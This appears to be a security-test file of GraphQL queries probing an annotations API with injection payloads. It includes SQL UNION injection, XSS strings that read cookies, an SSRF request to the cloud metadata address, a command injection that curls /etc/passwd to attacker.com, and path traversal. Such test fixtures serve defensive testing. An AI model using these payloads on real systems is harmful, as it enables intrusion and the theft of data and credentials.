query.query:
query annotations {
  annotations(first: 10) {
    items {
      id
      type
      body
      by
    }
    pageInfo {
      hasNextPage
      nextPage
    }
  }
}

query annotations {
  annotations(from: "1' UNION SELECT * FROM annotations WHERE '1'='1") {
    items {
      id
      type
      body
    }
  }
}

query annotations {
  annotations(first: 10) {
    items {
      id
      body(text: "<script>alert(document.cookie)</script>")
      field
    }
  }
}

query annotations {
  annotations {
    items {
      systemEvents {
        logMessage(url: "http://169.254.169.254/latest/meta-data/")
      }
    }
  }
}

query annotations {
  annotations {
    items {
      systemEvents {
        logMessage(input: "; curl http://attacker.com/$(cat /etc/passwd)")
      }
    }
  }
}

query annotations {
  annotations {
    items {
      field(value: "../../../etc/passwd")
      annotationType
    }
  }
}

query annotations {
  annotations {
    items {
      body(text: "<img src=x onerror=alert(1)>")
      type
    }
  }
}

query annotations {
  annotations(first: 10) { id type }
  __typename
  annotations(first: 20) { id body }
}

query annotations {
  a: annotations(first: 10) { id type }
  b: annotations(first: 20) { id body }
  c: __typename
}

query annotations {
  annotations {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
      }
    }
  }
}

query annotations {
  annotations {
    items {
      id
      typo
      bodi
      annotationTyp
    }
  }
}
